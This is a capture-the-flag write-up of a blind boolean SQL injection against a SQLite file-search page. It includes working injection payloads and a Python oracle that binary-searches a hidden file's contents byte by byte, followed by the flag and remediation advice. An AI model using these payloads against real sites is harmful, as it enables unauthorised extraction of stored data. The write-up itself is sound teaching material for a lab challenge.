# DropLite - blind/boolean SQLi (SQLite), count-flip oracle

| | |
|---|---|
| **Challenge** | DropLite |
| **Category** | SQLI |
| **Points / Difficulty** | 300 / hard |
| **Target** | http://sqli4.chal.deti:8033 |
| **Bug** | CWE-89 - blind/inferential SQL injection (SQLite) |

## Hint
> You see names and sizes, never the insides. Ask, then count the answers.

## Recon
- `GET /search?q=` searches file names: `... WHERE name LIKE '%<q>%'`, injected raw.
- The page shows **only a match count** (`<p class="muted">N file match</p>`) and
  file name/size - **no file contents**.
- Listing includes **`quarterly-keys.txt` (61 B)** - the flag is its `content`.

## Approach
No data channel, so it's **blind/boolean**: the match count is a yes/no oracle.
```
zzz' OR 1=1 --   -> 6 files   (TRUE)
zzz' OR 1=2 --   -> 0 files   (FALSE)
```
Turn any boolean into count>0 and **binary-search the content byte-by-byte**:

```
q = zzz' OR (SELECT unicode(substr(content,<pos>,1))
             FROM files WHERE name='quarterly-keys.txt') > <mid> --
```
- `oracle(cond)` = injecting `zzz' OR (cond) --` yields count > 0.
- Per character: binary-search the code in `[0,127]` (7 comparisons).
- Length first: binary-search `length(content)` → 38.

## Exploitation
`solve.py` - oracle + binary search. Core:
```python
def oracle(cond):
    q = f"zzz' OR ({cond}) -- "
    t = session.get(f"{BASE}/search", params={"q": q}).text
    m = re.search(r'muted">\s*(\d+)\s+file', t)
    return bool(m) and int(m.group(1)) > 0
# bsearch length(content), then unicode(substr(content,i,1)) for each i
```

## Flag
```
flag{84a88e28fdcb518ebdb066679bfdc7b2}
```

## Cost - PhotoVault vs DropLite (same SQLite, different channel)
| | PhotoVault (in-band UNION) | DropLite (blind boolean) |
|---|---|---|
| Channel | data printed into the page | yes/no match-count only |
| Requests to flag | **~2** | **274** |
| Technique | read the result | ask true/false, binary-search each byte |

Content length 38 (= `flag{...}`), 7 comparisons/char + length search ≈ 274 reqs.

## Root cause & remediation
- **Cause:** the search term is concatenated into the SQL `LIKE` clause (CWE-89);
  even with no data returned, the match count leaks a boolean, enabling
  inferential extraction of any column.
- **Fix:** parameterise the query (`WHERE name LIKE ?` with `%term%` bound);
  don't store secret file contents in a table reachable by the search query;
  add rate-limiting to blunt the hundreds of oracle requests a blind attack needs.
